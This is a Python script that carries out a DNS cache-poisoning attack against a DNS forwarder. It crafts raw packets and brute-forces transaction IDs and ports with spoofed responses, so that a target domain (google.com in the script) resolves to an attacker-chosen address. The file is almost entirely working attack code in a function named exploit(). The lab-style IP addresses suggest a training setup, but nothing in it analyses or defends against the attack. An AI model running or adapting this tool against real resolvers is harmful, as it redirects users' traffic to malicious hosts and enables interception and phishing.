import itertools
import struct
import socket
import time

import os
import sys
import psutil
import dpkt
import getmac
from pwn import hexdump

import dns as dnspython
import dns.message
import dns.query
import dns.rdatatype

from logkit import logger

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP, Ether


# HOST INFO
def get_local_ip(interface: str):
    addrs = psutil.net_if_addrs()
    if interface in addrs:
        for addr in addrs[interface]:
            if addr.family == socket.AF_INET:
                return addr.address
    logger.error(f"Unable to resolve IPv4 address for '{interface}' interface")


def get_mac(ip_or_interface = "") -> bytes:
    """Translate IPv4 or interface name to MAC address"""
    try:
        try:
            # IPv4
            socket.inet_aton(ip_or_interface)
            mac = getmac.get_mac_address(ip = ip_or_interface)
        except:
            # Interface
            mac = getmac.get_mac_address(interface = ip_or_interface)
        mac = bytes.fromhex(mac.replace(":", ""))
        return mac
    except Exception as e:
        logger.error(f"Unable to translate {ip_or_interface} to MAC address")


def verify_dns_record(verify_query: dnspython.message.QueryMessage, ip: str, port: int) -> bool:
    try:
        response = dnspython.query.udp(q = verify_query, where = ip, port = port, timeout = 0.01)
    except dns.exception.Timeout:
        return False
    if response:
        for answer in response.answer:
            for item in answer.items:
                if item.rdtype == dnspython.rdatatype.A:
                    logger.info("")
                    logger.info(f"Poisoned: {answer.name} → {item.address}")
                    return True
                break
    return False


# AUXILIARY
def bytes2str(bytes_seq):
    if type(bytes_seq) is not bytes:
        bytes_seq = bytes(bytes_seq)
    string = ""
    for b in bytes_seq:
        string += f"\\x{b:02x}"
    return string


def encode_domain(domain_name: str) -> bytes:
    """Return domain name, which is encoded in RFC 1035 compliant way"""

    levels = domain_name.split(".")
    encoded_dn = b""
    for level in levels:
        length = struct.pack("!B", len(level))
        encoded_dn += length + level.encode()
    encoded_dn += b"\x00"
    return encoded_dn


def construct_dns_answer(name: str, ttl: int, rdata: str, type: int, cls: int) -> bytearray:
    # Encode rdata
    if type == dpkt.dns.DNS_A:
        rdata = socket.inet_aton(rdata)
    elif type == dpkt.dns.DNS_CNAME:
        rdata = encode_domain(rdata)
    else:
        logger.error(f"Type '{type}' is not supported")

    # Construct answer
    answer = encode_domain(name) + \
             struct.pack("!H", type) + \
             struct.pack("!H", cls) + \
             struct.pack("!I", ttl) + \
             struct.pack("!H", len(rdata)) + \
             rdata
    return bytearray(answer)


def patch_udp(packet: bytearray, pseudo_hdr: bytes, udp_len: int, txid: int = None, dport: int = None) -> None:
    """
    Change UDP datagram's destination port & DNS packet's TXID
    Unless UDP datagram is encapsulated, udp_len should be set to 0
    """

    # Calculate UDP offset inside the outer packet
    udp_offset = len(packet) - udp_len
    if udp_offset < 0:
        logger.error(f"UDP datagram should be encapsulated within the outer packet.\n"
                     f"Outer packet length: {len(packet)}\n"
                     f"UDP datagram length: {udp_len}")

    # Set destination port in UDP
    if dport:
        packet[udp_offset + 2] = (dport >> 8) & 0xff
        packet[udp_offset + 3] = dport & 0xff

    # Set TXID in DNS
    if txid:
        packet[udp_offset + 8] = (txid >> 8) & 0xff
        packet[udp_offset + 9] = txid & 0xff

    # Recalculate UDP checksum
    packet[udp_offset + 6] = 0
    packet[udp_offset + 7] = 0
    ck = dpkt.in_cksum(pseudo_hdr + packet[udp_offset:])
    if ck == 0:
        ck = 0xffff
    cs = struct.pack("!H", ck)
    packet[udp_offset + 6] = cs[0]
    packet[udp_offset + 7] = cs[1]


# PACKET CONSTRUCTORS
def construct_uncached_query(forwarder: str, attacker: str, qname: str) -> [bytearray, bytes, int]:
    # DNS
    qd = dpkt.dns.DNS.Q(
        name = qname,  # Domain name to query
        type = dpkt.dns.DNS_A,  # A type record (IPv4 address)
        cls = dpkt.dns.DNS_IN  # Internet class
    )
    dns = dpkt.dns.DNS(
        id = 0xff,  # TXID
        rd = 1,  # Recursion Desired flag => recursive query resolution is requested
        qd = [qd],  # List of query records
        op = dpkt.dns.DNS_RD  # Recursion Desired operation
    )

    # UDP
    udp = dpkt.udp.UDP(
        sport = 0xffff,  # Source port
        dport = 53,  # Destination port
        data = bytes(dns)  # Encapsulated DNS packet
    )
    udp.ulen = len(udp)
    pseudo_hdr = struct.pack(
        "!4s4sHH",  # Big-endian, 4-byte str, 4-byte str, 2-byte int, 2-byte int
        socket.inet_aton(attacker),  # Source address
        socket.inet_aton(forwarder),  # Destination address
        dpkt.ip.IP_PROTO_UDP,  # UDP protocol
        udp.ulen
    )
    udp.sum = dpkt.in_cksum(pseudo_hdr + bytes(udp))  # Calculate CRC32 hash

    # IP
    ip = dpkt.ip.IP(
        src = socket.inet_aton(attacker),
        dst = socket.inet_aton(forwarder),
        id = 1,
        p = dpkt.ip.IP_PROTO_UDP,
        data = bytes(udp)  # Encapsulated UDP datagram
    )
    ip.len = len(ip)
    ip = bytearray(bytes(ip))  # Make IP packet mutable to change its fields later

    # # DEMO
    # qd = DNSQR(qname = qname, qtype = "A", qclass = "IN")
    # dns = DNS(id = 0xff, rd = 1, qd = qd)
    # udp = UDP(sport = 0xffff, dport = 53) / dns
    # demo_ip = IP(src = attacker, dst = forwarder) / udp
    # demo_ip.show()
    # exit(12)

    logger.info(f"Not cached DNS query (IP packet):\n{hexdump(ip)}\n")
    return [ip, pseudo_hdr, udp.ulen]


def construct_spoofed_response(forwarder: str, sniffer: str, qname: str, target: str, poison: str) -> [bytearray, bytes, int]:
    # DNS
    qd = dpkt.dns.DNS.Q(
        name = qname,
        type = dpkt.dns.DNS_A,
        cls = dpkt.dns.DNS_IN
    )
    an0 = construct_dns_answer(
        name = target,
        ttl = 900,  # TTL - Time to live (seconds)
        rdata = poison,
        type = dpkt.dns.DNS_A,
        cls = dpkt.dns.DNS_IN
    )
    an1 = construct_dns_answer(
        name = qname,
        ttl = 900,
        rdata = target,
        type = dpkt.dns.DNS_CNAME,
        cls = dpkt.dns.DNS_IN
    )
    dns = dpkt.dns.DNS(
        id = 0xff,
        qr = 1,  # Query Response flag
        ra = 1,  # Recursion Available flag
        qd = [qd],
        op = dpkt.dns.DNS_RA | dpkt.dns.DNS_RD | dpkt.dns.DNS_QR  # Recursion Available + Recursion Desired + Query Response
    )
    dns = bytearray(bytes(dns) + an1 + an0)
    dns[7] = 2  # Number of answers

    # UDP
    udp = dpkt.udp.UDP(
        sport = 53,
        dport = 0xffff,
        data = bytes(dns)
    )
    udp.ulen = len(udp)
    pseudo_hdr = struct.pack(
        "!4s4sHH",
        socket.inet_aton(sniffer),
        socket.inet_aton(forwarder),
        dpkt.ip.IP_PROTO_UDP, udp.ulen
    )
    udp.sum = dpkt.in_cksum(pseudo_hdr + bytes(udp))

    # IP
    ip = dpkt.ip.IP(
        id = 1,
        src = socket.inet_aton(sniffer),
        dst = socket.inet_aton(forwarder),
        p = dpkt.ip.IP_PROTO_UDP,
        data = bytes(udp)
    )
    ip.len = len(ip)

    # Ethernet
    eth = dpkt.ethernet.Ethernet(
        src = get_mac("eth0"),  # Source MAC address
        dst = get_mac(forwarder),  # Destination MAC address
        data = bytes(ip)  # Encapsulated IP packet
    )
    eth = bytearray(bytes(eth))

    # # DEMO
    # qd = DNSQR(qname = qname, qtype = "A", qclass = "IN")
    # an0 = DNSRR(rrname = target, ttl = 900, rdata = poison, type = "A", rclass = "IN")
    # an1 = DNSRR(rrname = qname, ttl = 900, rdata = target, type = "CNAME", rclass = "IN") / an0
    # dns = DNS(id = 0xff, qr = 1, ra = 1, qd = qd, an = an1)
    # udp = UDP(sport = 53, dport = 0xffff) / dns
    # ip = IP(src = sniffer, dst = forwarder) / udp
    # demo_eth = Ether(src = get_mac("eth0"), dst = get_mac(forwarder)) / ip
    # demo_eth.show()
    # exit(12)

    logger.info(f"Spoofed DNS response (Ethernet frame):\n{hexdump(eth)}\n")
    return [eth, pseudo_hdr, udp.ulen]


def construct_verify_query(target: str) -> dns.message.QueryMessage:
    udp = dnspython.message.make_query(target, dnspython.rdatatype.A)

    # # DEMO
    # qd = DNSQR(qname = target, qtype = "A", qclass = 'IN')
    # dns = DNS(id = 0xff, rd = 1, qd = qd)
    # old_udp = UDP(sport = 53, dport = 53) / dns
    # old_udp.show()
    # exit(12)

    logger.info(f"Verify DNS query (UDP datagram):\n{hexdump(udp.to_wire())}\n")
    return udp


# MAIN LOGIC
def exploit():
    # Defaults
    localhost = "127.0.0.1"
    interface = "eth0"
    if os.name == "nt":
        logger.warning("Windows environment detected. This script is designed for Linux usage")
        interface = "wlan0"

    # Target domain
    queue_size = 150
    qname = "example.com"
    target = "google.com"
    poison = "66.66.66.66"

    # Hosts in LAN
    forwarder = "10.0.0.2"
    sniffer = "10.0.0.3"
    attacker = get_local_ip(interface)

    logger.notice(f"Poisoning: {target} → {poison}\n")
    logger.info(f"Forwarder IP:  {forwarder}")
    logger.info(f"Sniffer IP:    {sniffer}")
    logger.info(f"Attacker IP:   {attacker}\n")

    # Construct packets
    uncached_query, uncached_pseudo_hdr, uncached_udp_len = construct_uncached_query(forwarder, attacker, qname)
    spoofed_response, spoofed_pseudo_hdr, spoofed_udp_len = construct_spoofed_response(forwarder, sniffer, qname, target, poison)
    verify_query = construct_verify_query(target)

    # Stage 1
    logger.notice(f"Querying non-cached domain name: {qname}")
    s3 = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)  # 3rd OSI layer - Network (IP packets)
    for txid in range(queue_size):
        print(f"\rTXID: {txid}", end = "")
        patch_udp(uncached_query, uncached_pseudo_hdr, uncached_udp_len, txid, None)
        s3.sendto(uncached_query, (forwarder, 53))
    s3.close()
    logger.info("")
    logger.success(f"Successfully queried name: {qname}\n")

    # Stage 2
    logger.notice("Generating spoofed responses")

    start_time = time.time()
    logger.info(f"Start time: {time.strftime('%H:%M:%S', time.localtime())}")

    s2 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)  # 2nd OSI layer - Data Link (Ethernet frames)
    s2.bind((interface, 0))
    txids = range(1, 0xffff)
    dports = range(1025, 0xffff)
    # candidates = itertools.product(txids, dports)
    pkts_num = 0
    for txid in txids:
        print(f"\rTXID: {txid}", end = "")
        for dport in dports:
            patch_udp(spoofed_response, spoofed_pseudo_hdr, spoofed_udp_len, txid, dport)
            s2.send(spoofed_response)
            pkts_num += 1
        if verify_dns_record(verify_query, forwarder, 53):
            break
    s2.close()

    end_time = time.time()
    logger.info(f"End time: {time.strftime('%H:%M:%S', time.localtime())}")

    logger.info(f"Sent {pkts_num} packets in {int(end_time - start_time)} seconds")
    logger.success(f"DNS spoofing has been successfully completed: {target} → {poison}")


def main():
    # Logger configuration
    tty = sys.stdout.isatty()
    logger.setup("", True, tty)
    if tty:
        logger.warning("TTY environment detected. Ensure you're running this script in Docker")

    exploit()


if __name__ == "__main__":
    main()
